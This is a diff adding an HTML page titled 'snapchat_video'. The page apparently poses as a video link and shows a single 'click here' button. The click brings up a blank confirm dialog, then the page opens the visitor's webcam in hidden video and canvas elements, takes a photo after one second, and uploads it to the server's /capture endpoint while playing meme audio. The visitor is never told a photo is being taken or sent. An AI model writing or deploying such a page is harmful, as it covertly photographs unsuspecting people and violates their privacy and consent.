@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>snapchat_video</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: black;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    #startButton {
+      padding: 15px 25px;
+      font-size: 18px;
+      border: none;
+      border-radius: 10px;
+      background-color: red;
+      color: white;
+      margin-top: 20px;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1></h1>
+  <p></p>
+  <button id="startButton"> click here </button>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+  <audio id="memeAudio" src="/static/meme_ram.mp4"></audio>
+
+  <script>
+    const startButton = document.getElementById("startButton");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const memeAudio = document.getElementById("memeAudio");
+
+    startButton.addEventListener("click", async () => {
+      const confirmPermission = confirm("");
+      if (!confirmPermission) return;
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.play();
+
+        setTimeout(() => {
+          // Draw the video frame to canvas
+          const context = canvas.getContext("2d");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // Convert to blob and send to backend
+          canvas.toBlob((blob) => {
+            const formData = new FormData();
+            formData.append("photo", blob, "capture.jpg");
+
+            fetch("/capture", {
+              method: "POST",
+              body: formData
+            }).then(() => {
+              console.log("Photo sent to server.");
+            });
+          }, "image/jpeg");
+
+          // Play meme audio
+          memeAudio.play();
+        }, 1000); // Wait 1s to capture
+      } catch (error) {
+        alert("Camera access denied or error: " + error.message);
+      }
+    });
+  </script>
+</body>
+</html>
